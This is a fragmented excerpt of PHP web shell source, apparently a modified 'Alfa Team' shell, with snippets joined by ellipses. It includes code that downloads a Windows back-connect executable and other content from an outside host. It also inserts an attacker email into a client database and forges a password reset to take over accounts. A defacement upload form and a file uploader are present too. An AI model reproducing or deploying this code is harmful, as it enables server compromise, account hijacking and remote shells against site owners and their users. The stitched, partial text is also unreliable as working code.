...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/ngeteng/tools/main/img/free-video-3045163.webp" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/ngeteng/tools/main/img/free-video-3045163.webp" /></td>
</tr>
<tr>
...
$curl = new AlfaCURL();
$content = $curl->Send("http://huhuhgt.com/mat.php");
...
$create = "insert into tblclients (email) values('bangkitdeveloper@gmail.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=bangkitdeveloper@gmail.com");
...
function alfacheckupdate(){
	...
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://huhuhgt/update.json?ver=".__ALFA_VERSION__);
...
$email = "bangkitdeveloper@gmail.com";
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ 専門学校 &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>入試 科目</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://www.sans.eu.org'>門学校</a></span></div></td>
</tr>
</table>
</div>
...
<textarea name=index rows='19' cols='103'><title>学校 おすすめ</title><b>学校 おすすめ</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By Kang Begal";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
<title>学校 おすすめ</title><b>学校 おすすめ</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
if($lang=='bcwin'){
$alfa = new AlfaCURL();
$s = $alfa->Send('http://huhuhgt/bc/windows.exe');
$tmpdir = ALFA_TEMPDIR;
